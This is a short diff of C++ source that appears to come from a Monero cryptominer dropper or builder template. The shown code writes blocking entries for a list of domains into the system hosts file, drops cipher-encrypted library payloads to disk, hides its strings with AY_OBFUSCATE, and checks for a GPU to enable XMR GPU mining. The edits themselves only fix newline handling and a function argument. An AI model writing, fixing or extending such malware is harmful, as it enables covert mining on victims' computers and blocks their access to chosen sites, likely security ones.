@@ -80,7 +80,8 @@ int wmain(int argc, wchar_t* argv[])
         char* domainSet[] = { $CPPDOMAINSET };
         for (int i = 0; i < $DOMAINSETSIZE; i++) {
             if (hostsString.find(domainSet[i]) == std::string::npos) {
-                hostsString += '\r\n';
+                hostsString += '\r';
+                hostsString += '\n';
                 hostsString.append(AY_OBFUSCATE("0.0.0.0      "));
                 hostsString.append(domainSet[i]);
             }
@@ -136,7 +137,7 @@ int wmain(int argc, wchar_t* argv[])
     write_file(libWR64Path, cipher(resWR64, resWR64Size), resWR64Size);
 #endif
 
-    bool hasGPU = has_gpu();
+    bool hasGPU = has_gpu(libPath);
 
 #if DefXMRGPU
     if (hasGPU) {
